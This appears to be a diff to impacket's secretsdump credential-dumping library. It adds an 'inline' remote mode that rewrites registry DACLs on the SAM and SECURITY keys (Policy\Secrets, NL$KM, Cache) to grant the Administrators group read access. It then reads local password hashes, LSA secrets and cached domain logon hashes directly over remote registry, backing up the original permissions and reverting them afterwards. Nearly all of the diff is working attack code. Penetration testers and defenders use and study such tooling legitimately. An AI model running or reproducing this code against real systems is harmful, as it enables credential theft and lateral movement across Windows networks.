@@ -47,6 +47,7 @@
 #   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
 #   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
 #
+import base64
 import codecs
 import json
 import hashlib
@@ -68,9 +69,11 @@ from impacket import system_errors
 from impacket import winregistry, ntlm
 from impacket.ldap.ldap import SimplePagedResultsControl, LDAPSearchError
 from impacket.ldap.ldapasn1 import SearchResultEntry
+from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import LDAP_SID
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi, lsad
-from impacket.dcerpc.v5.dtypes import NULL, SID, MAXIMUM_ALLOWED
+from impacket.dcerpc.v5.dtypes import NULL, SID, MAXIMUM_ALLOWED, OWNER_SECURITY_INFORMATION, \
+    GROUP_SECURITY_INFORMATION, DACL_SECURITY_INFORMATION
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
@@ -463,6 +466,9 @@ class RemoteOperations:
         self.__answerTMP = b''
 
         self.__execMethod = 'smbexec'
+        self.__sdHistory = {}
+        self.__keyHistory = []
+        self.__backupDaclFile = 'secretsdump_dacl_backup.json'
 
     def setExecMethod(self, method):
         self.__execMethod = method
@@ -483,6 +489,50 @@ class RemoteOperations:
 
     def getRRP(self):
         return self.__rrp
+
+    def getRegHandle(self):
+        return self.__regHandle
+
+    def getRegValue(self, keyValue):
+        regKey = ntpath.dirname(keyValue)
+        regValue = ntpath.basename(keyValue)
+        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, regKey)
+        keyHandle = ans['phkResult']
+        if regValue == 'default':
+            regValue = ''
+        _dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, regValue)
+        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+        return dataValue
+
+    def enumRegSubKeys(self, keyPath):
+        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, keyPath)
+        keyHandle = ans['phkResult']
+        names = []
+        i = 0
+        while True:
+            try:
+                key = rrp.hBaseRegEnumKey(self.__rrp, keyHandle, i)
+                names.append(key['lpNameOut'][:-1])
+                i += 1
+            except Exception:
+                break
+        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+        return names
+
+    def enumRegValues(self, keyPath):
+        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, keyPath)
+        keyHandle = ans['phkResult']
+        names = []
+        i = 0
+        while True:
+            try:
+                key = rrp.hBaseRegEnumValue(self.__rrp, keyHandle, i)
+                names.append(key['lpValueNameOut'][:-1])
+                i += 1
+            except Exception:
+                break
+        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+        return names
 
     def connectSamr(self, domain):
         rpc = transport.DCERPCTransportFactory(self.__stringBindingSamr)
@@ -1433,6 +1483,119 @@ class RemoteOperations:
         LOG.debug('Downloaded SAM, SYSTEM and SECURITY from Shadow Snapshot. Dumping...')
         return list(zip(*paths))[0]
 
+    def __create_ace(self, sid, mask):
+        ace = ldaptypes.ACE()
+        ace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+        ace['AceFlags'] = ldaptypes.ACE.CONTAINER_INHERIT_ACE
+        ace_data = ldaptypes.ACCESS_ALLOWED_ACE()
+        ace_data['Mask'] = ldaptypes.ACCESS_MASK()
+        ace_data['Mask']['Mask'] = mask
+        ace_data['Sid'] = ldaptypes.LDAP_SID()
+        ace_data['Sid'].fromCanonical(sid)
+        ace['Ace'] = ace_data
+        return ace
+
+    def __create_sd(self, control, owner_sid, group_sid, sacl, acl):
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+        sd['Revision'] = b'\x01'
+        sd['Sbz1'] = b'\x00'
+        sd['Control'] = control
+        sd['OwnerSid'] = owner_sid
+        sd['GroupSid'] = group_sid
+        sd['Sacl'] = sacl
+        sd['Dacl'] = acl
+        return sd
+
+    def changeDacl(self, keys, sid):
+        for key in keys:
+            if key in self.__keyHistory:
+                continue
+            try:
+                ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, key)
+            except Exception:
+                continue
+
+            LOG.debug('Changing DACL for %s' % key)
+            keyHandle = ans['phkResult']
+            try:
+                ans = rrp.hBaseRegGetKeySecurity(
+                    self.__rrp, keyHandle,
+                    OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION)
+            except Exception as e:
+                LOG.error('Exception hBaseRegGetKeySecurity: %s' % e)
+                rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+                continue
+
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(
+                data=b''.join(ans['pRpcSecurityDescriptorOut']['lpSecurityDescriptor']))
+            mask = (ldaptypes.ACCESS_MASK.WRITE_DACL | ldaptypes.ACCESS_MASK.READ_CONTROL |
+                    rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
+            ace = self.__create_ace(sid, mask)
+            acl = ldaptypes.ACL(sd['Dacl'].getData())
+            acl.aces.append(ace)
+            acl['AceCount'] = len(acl.aces)
+            new_acl = ldaptypes.ACL(data=acl.getData())
+            new_sd = self.__create_sd(sd['Control'], sd['OwnerSid'], sd['GroupSid'], b'', new_acl)
+            try:
+                rrp.hBaseRegSetKeySecurity(self.__rrp, keyHandle, new_sd, DACL_SECURITY_INFORMATION)
+            except Exception as e:
+                LOG.error('Exception hBaseRegSetKeySecurity: %s' % e)
+                rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+                continue
+
+            self.__keyHistory.append(key)
+            self.__sdHistory[key] = base64.b64encode(sd.getData()).decode('utf-8')
+            with open(self.__backupDaclFile, 'w') as file:
+                json.dump(self.__sdHistory, file)
+            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+
+    def revertDacl(self):
+        for key in reversed(list(self.__keyHistory)):
+            LOG.debug('Reverting DACL for %s' % key)
+            try:
+                ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, key)
+            except Exception as e:
+                LOG.error('Exception hBaseRegOpenKey: %s' % e)
+                continue
+            keyHandle = ans['phkResult']
+            try:
+                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=base64.b64decode(self.__sdHistory[key]))
+                rrp.hBaseRegSetKeySecurity(self.__rrp, keyHandle, sd, DACL_SECURITY_INFORMATION)
+            except Exception as e:
+                LOG.error('Exception hBaseRegSetKeySecurity: %s' % e)
+                rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+                continue
+            self.__sdHistory.pop(key, None)
+            if key in self.__keyHistory:
+                self.__keyHistory.remove(key)
+            with open(self.__backupDaclFile, 'w') as file:
+                json.dump(self.__sdHistory, file)
+            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
+
+    def restoreDaclFromFile(self):
+        ans = rrp.hOpenLocalMachine(self.__rrp)
+        self.__regHandle = ans['phKey']
+        if os.path.exists(self.__backupDaclFile):
+            with open(self.__backupDaclFile, 'r') as file:
+                serialized_dict = json.load(file)
+                for key, value in serialized_dict.items():
+                    self.__keyHistory.append(key)
+                    self.__sdHistory[key] = value
+
+    def prepareDumpInline(self):
+        keys = [
+            r'SAM\SAM', r'SAM\SAM\Domains', r'SAM\SAM\Domains\Account',
+            r'SAM\SAM\Domains\Account\Users', r'SECURITY\Policy\Secrets',
+            r'SECURITY\Policy\Secrets\NL$KM', r'SECURITY\Policy\Secrets\NL$KM\CurrVal',
+            r'SECURITY\Cache', r'SECURITY\Policy\PolEKList',
+            r'SECURITY\Policy\PolSecretEncryptionKey',
+        ]
+        try:
+            self.changeDacl(keys, 'S-1-5-32-544')
+        except Exception as e:
+            LOG.error('Changing ACLs failed: %s' % e)
+            self.revertDacl()
+
 class CryptoCommon:
     # Common crypto stuff used over different classes
     def deriveKey(self, baseKey):
@@ -1542,7 +1705,7 @@ class OfflineRegistry:
             self.__registryHive.close()
 
 class SAMHashes(OfflineRegistry):
-    def __init__(self, samFile, bootKey, isRemote=False, history=False, printUserStatus=False, perSecretCallback=lambda secret: _print_helper(secret), pwdLastSet=False):
+    def __init__(self, samFile, bootKey, isRemote=False, history=False, printUserStatus=False, perSecretCallback=lambda secret: _print_helper(secret), pwdLastSet=False, remoteOps=None, isInline=False):
         OfflineRegistry.__init__(self, samFile, isRemote)
         self.__samFile = samFile
         self.__hashedBootKey = b''
@@ -1554,6 +1717,8 @@ class SAMHashes(OfflineRegistry):
         self.__history = history
         self.__historyItems = []
         self.__pwdLastSet = pwdLastSet
+        self.__remoteOps = remoteOps
+        self.__isInline = isInline
 
     def binary_to_sid(self, binary_data, without_prefix=False):
         if len(binary_data) < 12:
@@ -1601,7 +1766,10 @@ class SAMHashes(OfflineRegistry):
         QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
         DIGITS = b"0123456789012345678901234567890123456789\0"
 
-        F = self.getValue(ntpath.join(r'SAM\Domains\Account','F'))[1]
+        if self.__isInline is True:
+            F = self.__remoteOps.getRegValue(r'SAM\SAM\Domains\Account\F')
+        else:
+            F = self.getValue(ntpath.join(r'SAM\Domains\Account','F'))[1]
 
         domainData = DOMAIN_ACCOUNT_F(F)
 
@@ -1784,7 +1952,7 @@ class SAMHashes(OfflineRegistry):
         NTPASSWORD = b"NTPASSWORD\0"
         LMPASSWORD = b"LMPASSWORD\0"
 
-        if self.__samFile is None:
+        if self.__samFile is None and self.__isInline is False:
             # No SAM file provided
             return
 
@@ -1795,27 +1963,37 @@ class SAMHashes(OfflineRegistry):
         usersKey = 'SAM\\Domains\\Account\\Users'
 
         # Enumerate all the RIDs
-        rids = self.enumKey(usersKey)
+        if self.__isInline is True:
+            usersKey = r'SAM\SAM\Domains\Account\Users'
+            rids = self.__remoteOps.enumRegSubKeys(usersKey)
+        else:
+            rids = self.enumKey(usersKey)
         # Remove the Names item
         try:
             rids.remove('Names')
         except:
             pass
 
-        F = self.getValue(ntpath.join(r'SAM\Domains\Account','F'))[1]
-        domainData = DOMAIN_ACCOUNT_F(F)
-        LockoutThreshold = domainData['LockoutThreshold']
-        LockoutDuration = domainData['LockoutDuration']
-        LockoutDurationMinutes = timedelta(microseconds=abs(LockoutDuration) // 10).total_seconds() / 60
-
-        V = self.getValue(ntpath.join(r'SAM\Domains\Account','V'))[1]
-        domainDataV = DOMAIN_ACCOUNT_V(V)
-        system_sid = self.binary_to_sid(domainDataV['SystemSid'], without_prefix=True)
-
-        groups_root = r'SAM\Domains\Builtin\Aliases'
+        LockoutThreshold = 0
+        LockoutDurationMinutes = 0
+        system_sid = ''
+        local_admins = []
         groups = OrderedDict()
 
-        for entry in self.enumKey(groups_root):
+        if self.__isInline is False:
+            F = self.getValue(ntpath.join(r'SAM\Domains\Account','F'))[1]
+            domainData = DOMAIN_ACCOUNT_F(F)
+            LockoutThreshold = domainData['LockoutThreshold']
+            LockoutDuration = domainData['LockoutDuration']
+            LockoutDurationMinutes = timedelta(microseconds=abs(LockoutDuration) // 10).total_seconds() / 60
+
+            V = self.getValue(ntpath.join(r'SAM\Domains\Account','V'))[1]
+            domainDataV = DOMAIN_ACCOUNT_V(V)
+            system_sid = self.binary_to_sid(domainDataV['SystemSid'], without_prefix=True)
+
+            groups_root = r'SAM\Domains\Builtin\Aliases'
+
+        for entry in ([] if self.__isInline else self.enumKey(groups_root)):
             if not entry.startswith("00000"):
                 continue
 
@@ -1862,28 +2040,33 @@ class SAMHashes(OfflineRegistry):
 
         for rid in rids:
             disabled = locked_out = auto_locked = is_admin = False
+            userAccountF = None
 
-            userAccountF = USER_ACCOUNT_F(self.getValue(ntpath.join(usersKey, rid, 'F'))[1])
-            InvalidPWDCount = userAccountF['InvalidPWDCount']
-            LastIncorrectPasswordTimestamp = userAccountF['LastIncorrectPasswordTimestamp']
-            LastIncorrectPasswordTimestamp_datetime = self.nt_time_to_datetime(LastIncorrectPasswordTimestamp)
-            UserNumber = userAccountF['UserNumber']
-            user_sid = f"{system_sid}-{UserNumber}"
+            if self.__isInline is True:
+                self.__remoteOps.changeDacl([ntpath.join(usersKey, rid)], 'S-1-5-32-544')
+                raw_v = self.__remoteOps.getRegValue(ntpath.join(usersKey, rid, 'V'))
+            else:
+                userAccountF = USER_ACCOUNT_F(self.getValue(ntpath.join(usersKey, rid, 'F'))[1])
+                InvalidPWDCount = userAccountF['InvalidPWDCount']
+                LastIncorrectPasswordTimestamp = userAccountF['LastIncorrectPasswordTimestamp']
+                LastIncorrectPasswordTimestamp_datetime = self.nt_time_to_datetime(LastIncorrectPasswordTimestamp)
+                UserNumber = userAccountF['UserNumber']
+                user_sid = f"{system_sid}-{UserNumber}"
 
-            is_admin = user_sid in local_admins
-            locked = InvalidPWDCount >= LockoutThreshold
+                is_admin = user_sid in local_admins
+                locked = InvalidPWDCount >= LockoutThreshold
 
-            if locked:  # Let's check if the LockoutDuration has passed.
-                lockout_expiry_time = LastIncorrectPasswordTimestamp_datetime + timedelta(minutes=LockoutDurationMinutes)
-                now = datetime.utcnow()
-                locked = now < lockout_expiry_time  # Compare current time with lockout expiry
+                if locked:  # Let's check if the LockoutDuration has passed.
+                    lockout_expiry_time = LastIncorrectPasswordTimestamp_datetime + timedelta(minutes=LockoutDurationMinutes)
+                    now = datetime.utcnow()
+                    locked = now < lockout_expiry_time  # Compare current time with lockout expiry
 
-            grouped_data = userAccountF['GroupedData']
-            disabled = bool(grouped_data & 0x0001)
-            auto_locked = bool(grouped_data & 0x0400)
-            locked_out = locked
+                grouped_data = userAccountF['GroupedData']
+                disabled = bool(grouped_data & 0x0001)
+                auto_locked = bool(grouped_data & 0x0400)
+                locked_out = locked
 
-            raw_v = self.getValue(ntpath.join(usersKey, rid, 'V'))[1]
+                raw_v = self.getValue(ntpath.join(usersKey, rid, 'V'))[1]
             userAccount = USER_ACCOUNT_V(raw_v)
             rid = int(rid, 16)
 
@@ -1927,7 +2110,7 @@ class SAMHashes(OfflineRegistry):
 
             answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash).decode('utf-8'), hexlify(ntHash).decode('utf-8'))
 
-            if self.__pwdLastSet:
+            if self.__pwdLastSet and userAccountF is not None:
                 if userAccountF['PasswordLastSetTimeStamp'] is not None:
                     pwdLastSet = self.nt_time_to_datetime(userAccountF['PasswordLastSetTimeStamp'])
                     # No datetime set, set value to 'never' to be consistent with NTDS parsing and output
@@ -2108,7 +2291,7 @@ class LSASecrets(OfflineRegistry):
 
     def __init__(self, securityFile, bootKey, remoteOps=None, isRemote=False, history=False,
                  perSecretCallback=lambda secretType, secret: _print_helper(secret),
-                 systemHive=None):
+                 systemHive=None, isInline=False):
         OfflineRegistry.__init__(self, securityFile, isRemote)
         self.__hashedBootKey = b''
         self.__bootKey = bootKey
@@ -2123,6 +2306,7 @@ class LSASecrets(OfflineRegistry):
         self.__perSecretCallback = perSecretCallback
         self.__history = history
         self.__systemHive = systemHive
+        self.__isInline = isInline
 
     def MD5(self, data):
         md5 = hashlib.new('md5')
@@ -2189,11 +2373,19 @@ class LSASecrets(OfflineRegistry):
     def __getLSASecretKey(self):
         LOG.debug('Decrypting LSA Key')
         # Let's try the key post XP
-        value = self.getValue('\\Policy\\PolEKList\\default')
+        if self.__isInline is True:
+            value = self.__remoteOps.getRegValue(r'SECURITY\Policy\PolEKList\default')
+            value = None if value is None else (None, value)
+        else:
+            value = self.getValue('\\Policy\\PolEKList\\default')
         if value is None:
             LOG.debug('PolEKList not found, trying PolSecretEncryptionKey')
             # Second chance
-            value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
+            if self.__isInline is True:
+                value = self.__remoteOps.getRegValue(r'SECURITY\Policy\PolSecretEncryptionKey\default')
+                value = None if value is None else (None, value)
+            else:
+                value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
             self.__vistaStyle = False
             if value is None:
                 # No way :(
@@ -2203,7 +2395,11 @@ class LSASecrets(OfflineRegistry):
 
     def __getNLKMSecret(self):
         LOG.debug('Decrypting NL$KM')
-        value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
+        if self.__isInline is True:
+            raw = self.__remoteOps.getRegValue(r'SECURITY\Policy\Secrets\NL$KM\CurrVal\default')
+            value = None if raw is None else (None, raw)
+        else:
+            value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
         if value is None:
             raise Exception("Couldn't get NL$KM value")
         if self.__vistaStyle is True:
@@ -2236,14 +2432,18 @@ class LSASecrets(OfflineRegistry):
         return user
 
     def dumpCachedHashes(self):
-        if self.__securityFile is None:
+        if self.__securityFile is None and self.__isInline is False:
             # No SECURITY file provided
             return
 
         LOG.info('Dumping cached domain logon information (domain/username:hash)')
 
         # Let's first see if there are cached entries
-        values = self.enumValues('\\Cache')
+        if self.__isInline is True:
+            cacheKey = r'SECURITY\Cache'
+            values = self.__remoteOps.enumRegValues(cacheKey)
+        else:
+            values = self.enumValues('\\Cache')
         if values is None:
             # No cache entries
             return
@@ -2255,10 +2455,16 @@ class LSASecrets(OfflineRegistry):
 
         iterationCount = 10240
 
-        if b'NL$IterationCount' in values:
-            values.remove(b'NL$IterationCount')
+        if b'NL$IterationCount' in values or 'NL$IterationCount' in values:
+            try:
+                values.remove(b'NL$IterationCount')
+            except ValueError:
+                values.remove('NL$IterationCount')
 
-            record = self.getValue('\\Cache\\NL$IterationCount')[1]
+            if self.__isInline is True:
+                record = self.__remoteOps.getRegValue(ntpath.join(cacheKey, 'NL$IterationCount'))
+            else:
+                record = self.getValue('\\Cache\\NL$IterationCount')[1]
             if record > 10240:
                 iterationCount = record & 0xfffffc00
             else:
@@ -2268,8 +2474,12 @@ class LSASecrets(OfflineRegistry):
         self.__getNLKMSecret()
 
         for value in values:
-            LOG.debug('Looking into %s' % value.decode('utf-8'))
-            record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value.decode('utf-8')))[1])
+            valueName = value.decode('utf-8') if isinstance(value, (bytes, bytearray)) else value
+            LOG.debug('Looking into %s' % valueName)
+            if self.__isInline is True:
+                record = NL_RECORD(self.__remoteOps.getRegValue(ntpath.join(cacheKey, valueName)))
+            else:
+                record = NL_RECORD(self.getValue(ntpath.join('\\Cache', valueName))[1])
             if record['IV'] != 16 * b'\x00':
             #if record['UserLength'] > 0:
                 if record['Flags'] & 1 == 1:
@@ -2511,20 +2721,27 @@ class LSASecrets(OfflineRegistry):
         return True
 
     def dumpSecrets(self):
-        if self.__securityFile is None:
+        if self.__securityFile is None and self.__isInline is False:
             # No SECURITY file provided
             return
 
         LOG.info('Dumping LSA Secrets')
 
-        # Let's first see if there are cached entries
-        keys = self.enumKey('\\Policy\\Secrets')
+        if self.__isInline is True:
+            policyKey = r'SECURITY\Policy\Secrets'
+            keys = self.__remoteOps.enumRegSubKeys(policyKey)
+        else:
+            keys = self.enumKey('\\Policy\\Secrets')
         if keys is None:
             # No entries
             return
         try:
             # Remove unnecessary value
             keys.remove(b'NL$Control')
+        except:
+            pass
+        try:
+            keys.remove('NL$Control')
         except:
             pass
 
@@ -2540,7 +2757,13 @@ class LSASecrets(OfflineRegistry):
 
             for valueType in valueTypeList:
                 isHistory = False
-                value = self.getValue('\\Policy\\Secrets\\{}\\{}\\default'.format(key,valueType))
+                if self.__isInline is True:
+                    self.__remoteOps.changeDacl([ntpath.join(policyKey, key)], 'S-1-5-32-544')
+                    self.__remoteOps.changeDacl([ntpath.join(policyKey, key, valueType)], 'S-1-5-32-544')
+                    raw = self.__remoteOps.getRegValue(ntpath.join(policyKey, key, valueType, 'default'))
+                    value = None if raw in (None, 0, b'') else (None, raw)
+                else:
+                    value = self.getValue('\\Policy\\Secrets\\{}\\{}\\default'.format(key,valueType))
                 if value is not None and value[1] != 0:
                     if self.__vistaStyle is True:
                         record = LSA_SECRET(value[1])
